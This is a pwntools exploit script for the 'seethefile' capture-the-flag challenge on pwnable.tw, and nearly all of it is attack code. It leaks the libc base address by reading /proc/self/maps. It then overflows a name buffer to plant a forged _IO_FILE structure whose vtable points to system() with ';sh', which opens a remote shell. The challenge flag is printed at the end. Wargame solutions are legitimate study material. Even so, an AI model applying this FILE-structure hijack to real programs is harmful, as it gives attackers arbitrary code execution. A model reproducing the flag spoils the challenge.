#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
  return io.recvline()
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('seethefile')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10200)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *0x08048AC6
continue
'''.format(**locals())

# -- Exploit goes here --

"""
seethefile:x:1000:1000::/home/seethefile:
flag:x:1001:1001::/home/flag:
"""

"""
struct _IO_FILE_plus
{
    FILE file;
    const struct _IO_file_jumps *vtable;
};
"""


io = start()

_sndla(':', 1)
_sndla(':', '/proc/self/maps')
for i in range(2):
    _sndla('choice :', 2)
    _sndla('choice :', 3)
_rcvl()
base = int(_rcvu('-').replace('-', ''), 16)
log.success("Leaked libc base {}".format(hex(base)))
libc = ELF('./libc_32.so.6')
libc.address = base

_sndla(':', 5)

file_struct_addr = 0x0804B284

# this i learnt about how FILE* works:
# all functions from the vtable will receive the pointer to the structure itself
# if i fill the structure with zeroes, the field that stores the file descriptor will be 0 too. so, when fclose() is called, stdin will be closed
# _lock should be a pointer to a structure, filled with 0'es if you don't want any problems
# #define _IO_USER_LOCK 0x8000 this flag must not be set in the structure. if it is set the program will hang
file_struct_payload = "A\xc1AA" + ";sh\x00" + p32(0x5)*16+p32(0x0804B284)+p32(0x804b31c)*19+p32(libc.symbols['system'])*20

_sndla(':', "A"*32+p32(file_struct_addr)+file_struct_payload)
io.interactive()

# FLAG{F1l3_Str34m_is_4w3s0m3}

